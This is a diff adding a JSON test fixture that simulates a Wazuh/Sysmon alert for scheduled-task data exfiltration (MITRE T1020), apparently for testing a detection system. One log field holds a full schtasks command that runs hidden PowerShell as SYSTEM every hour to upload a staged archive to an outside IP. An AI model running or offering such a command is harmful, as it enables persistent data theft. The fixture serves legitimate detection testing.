@@ -1,0 +1,87 @@
+{
+  "_metadata": {
+    "attack_id": "T1020",
+    "variation": "001",
+    "name": "Automated Exfiltration via Scheduled Task",
+    "description": "Attacker creates scheduled task to automatically exfiltrate data at regular intervals",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - schtasks create for exfiltration",
+      "sequence": 1,
+      "timestamp": "2026-02-04T22:45:00.000Z",
+      "log": {
+        "timestamp": "2026-02-04T22:45:00.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Process Create",
+          "id": "100900",
+          "mitre": {
+            "id": [
+              "T1020",
+              "T1053.005"
+            ],
+            "tactic": [
+              "Exfiltration",
+              "Persistence"
+            ],
+            "technique": [
+              "Automated Exfiltration",
+              "Scheduled Task"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706917500.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.Pooka.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-04 22:45:00.000",
+              "processGuid": "{DC01-DH03-0001-0001-000000000001}",
+              "processId": "5520",
+              "image": "C:\\Windows\\System32\\schtasks.exe",
+              "commandLine": "schtasks /create /tn \"DataExfil\" /tr \"powershell -ep bypass -c Invoke-WebRequest -Uri http://185.141.27.98/upload -Method POST -InFile C:\\Users\\Public\\staged\\data.zip\" /sc hourly /ru SYSTEM",
+              "currentDirectory": "C:\\Users\\Administrator\\",
+              "user": "POOKA\\Administrator",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{DC01-DH03-0001-0001-000000000000}",
+              "parentProcessId": "3456",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        },
+        "_fomorian_batch": "campaign7-deep-harvest",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1020",
+        "_fomorian_expected_detection": "Sigma: Automated Exfiltration via Scheduled Task (T1020)"
+      }
+    }
+  ]
+}
